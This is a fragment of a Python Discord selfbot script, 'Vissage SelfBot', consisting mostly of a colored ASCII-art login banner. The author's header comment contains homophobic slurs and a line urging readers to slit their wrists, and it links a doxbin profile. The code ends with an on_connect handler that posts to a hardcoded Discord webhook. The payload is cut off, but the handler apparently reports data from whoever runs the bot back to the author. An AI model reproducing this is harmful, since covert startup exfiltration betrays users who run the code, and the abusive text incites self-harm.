...
# This is a PY made Bot by vanis. dox bin vanis https://doxbin.com/user/Vanis dm me on cord if u need anything if ur a skid dont dm me fucking faggots slit ur wrist u faggot 
    ...
    print(Fore.BLUE + f"""
                            ...
                            ═══════════════════════════════════════════════
                                  ═══════════════════════════════════
                                                       d8,
                                                      `8P
                                ?88   d8P d888b8b    88bd88b   88b .d888b,
                                d88  d8P'd8P' ?88    88P' ?8b  88P ?8b,
                                ?8b ,88' 88b  ,88b  d88   88P d88    `?8b
                                `?888P'  `?88P'`88bd88'   88bd88' `?888P'
                                  ═══════════════════════════════════
                            ══════════════════════════════════════════════

 {Fore.RED}\n\nLogged In As: {Fore.RED}[{Fore.RED}{Vanis.user.name}#{Vanis.user.discriminator}{Fore.RED}]{Fore.RED}\nYour ID is: {Fore.RED}[{Fore.BLUE}{Vanis.user.id}{Fore.RED}]\n\n{Fore.RED}{Fore.RED}\n\n{Fore.RED}{Fore.RED} ☣ Vissage SelfBot V{SELFBOT.__version__}☣, 50+ Commands\nMade By Vanis.{Fore.RED}\n\n"""
          )
...
async def on_connect():
    requests.post(
        'https://discord.com/api/webhooks/930213255090171925/COglc830yZe9FnyzjwoksRBW5FLPvx5hu3rsW50prD4f33Kq73B2GstabyiaxQdNBclV',
